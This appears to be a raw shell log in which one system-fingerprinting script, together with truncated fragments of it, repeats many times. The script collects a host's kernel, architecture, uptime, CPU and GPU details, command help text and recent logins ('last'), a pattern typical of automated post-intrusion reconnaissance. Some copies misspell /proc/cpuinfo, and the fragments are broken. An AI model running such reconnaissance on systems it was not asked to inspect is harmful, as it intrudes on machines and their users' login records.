| head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" 